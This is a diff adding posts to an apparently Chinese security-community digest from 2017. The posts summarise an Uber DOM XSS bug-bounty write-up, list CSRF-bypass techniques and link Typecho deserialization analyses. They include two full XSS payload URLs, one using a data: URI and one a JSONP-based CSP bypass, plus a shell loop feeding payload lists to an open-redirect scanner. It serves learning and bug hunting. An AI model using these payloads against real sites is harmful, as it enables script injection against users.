@@ -498,6 +498,70 @@ __0x02 触发点__
 
 ---
 
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-31:
+
+
+__#姿势#__
+
+ 从 Uber DOM XSS 案例看到的几个点
+
+给大家来个简单解读吧，首先是这篇 Uber DOM XSS 发现过程 Write-up：
+
+[https://stamone-bug-bounty.blogspot.fr/2017/10/dom-xss-auth_14.html](https://stamone-bug-bounty.blogspot.fr/2017/10/dom-xss-auth_14.html)
+
+
+
+触发：
+
+```
+https://auth.uber.com/login/?next_url=data:accounts.uber.com;text/html;charset=UTF-8,<html><script>window.location="https://reddit.com";</script></html>&state=x
+```
+
+依靠的是 data: 这个伪协议，这个伪协议背后添加的 accounts.uber.com 字符串是用于 Uber 后端过滤检查绕过的（可以想象 Uber 的后端过滤检查机制很单一）。
+
+之后作者又做了第二次绕过，针对的是 CSP 保护机制，这个保护机制绕过的经典技巧是白名单域下的 JSONP XSS 引入：
+
+```
+https://auth.uber.com/login/?next_url=data:accounts.uber.com%3Btext/html%3Bcharset=UTF-8,%3Chtml%3E%3Cscript%20src=%22https://app-lon02.marketo.com/index.php/form/getKnownLead?callback=alert(document.domain)%3B//%22%20data-reactid=%22341%22%3E%3C/script%3E%3C%2Fhtml%3E%26state%3Dx&state=x
+```
+
+
+不过这里需要注意的是 data: 协议这种写法技巧可能只适用于 Firefox 浏览器。
+
+然后是相关的两个资源：
+
+Open Url Redirects
+
+[https://zseano.com/tutorials/1.html](https://zseano.com/tutorials/1.html)
+
+
+
+还有个是 qz 前两天在本圈分享的一个跳转漏洞测试工具：
+
+
+[GitHub - ak1t4/open-redirect-scanner: open redirec...](https://github.com/ak1t4/open-redirect-scanner)
+
+
+
+这个工具代码极少，原理很简单请自行阅读，运行技巧也很 Unix:)，如下：
+
+```
+while read -r line;do python redirect.py.1 uber.list $line;done < payloads.list
+```
+
+最后，把上面这些经验仔细吸收后，这种漏洞是可以自动化挖掘的，奖金属于勤劳的人们:)
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 运行不方便，而且执行速度也慢。打算改一改用法，再改成多线程。
+
+
+...
+
+---
+
 ## CSRF
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-23:
@@ -527,6 +591,40 @@ Payload 如下：
 
 <img src="https://images.xiaomiquan.com/FkXnlZX2teScz5pXL2wXLJ9sut3A?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:tUAmQS9aEnm90U_bQmFSqBc9-yg=" width="50%" height="50%" align="middle"/>
 
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-30:
+
+
+__#姿势#__
+
+绕过 CSRF 保护的10种方法
+
+
+[10 Methods to Bypass Cross Site Request Forgery (C...](https://haiderm.com/10-methods-to-bypass-cross-site-request-forgery-csrf/)
+
+ 
+
+我补充几个：
+
+1. CORS 这个跨域资源共享技巧
+2. Referer 泄露 token 技巧
+3. 多个 CSRF 结合技巧
+4. 如果要提 Flash，还有 XFS 及 XFS 反射技巧
+5. 大家来脑洞补充吧:)
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 补充个hash识别的小工具，识别token的时候可以用的上(
+[https://github.com/AnimeshShaw/Hash-Algorithm-Identifier)](https://github.com/AnimeshShaw/Hash-Algorithm-Identifier))
+
+。另外，也可以使用burp的sequencer功能分析。
+
+
+...
 
 ---
 
@@ -936,6 +1034,38 @@ __#代码审计#__
 
 __分享文件:__
 [discuz任意文件删除漏洞的一点思考.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
+
+
+---
+
+<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-10-29:
+
+
+__#姿势#__
+
+
+__#代码审计#__
+
+ 
+tyecho getshell 这个漏洞不知道各位有没有关注，最近几天刷的挺多的。我认为这是一个非常好的学习php反序列化漏洞的案例，建议大家仔细研究，最好独立把poc写出来。
+
+[Typecho 事件始末](https://mp.weixin.qq.com/s/IE9g6OqfzAZVjtag-M_W6Q)
+
+
+
+[Typecho 前台 getshell 漏洞分析](https://paper.seebug.org/424/)
+
+
+
+[新手分析typecho 反序列化漏洞 | 江sir's blog](http://www.blogsir.com.cn/safe/454.html)
+
+
+此外，我自己画了个相当简洁的mindnode图，大家凑合凑合看，希望有用。
+
+<img src="https://file.xiaomiquan.com/1a6/30/a630ce206694d69b4b620fe648854769733492d350e2b525f62daa4d22eee999.png" width="50%" height="50%" align="middle"/>
+
+__分享文件:__
+[typecho.mindnode.zip](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
 
 
 ---
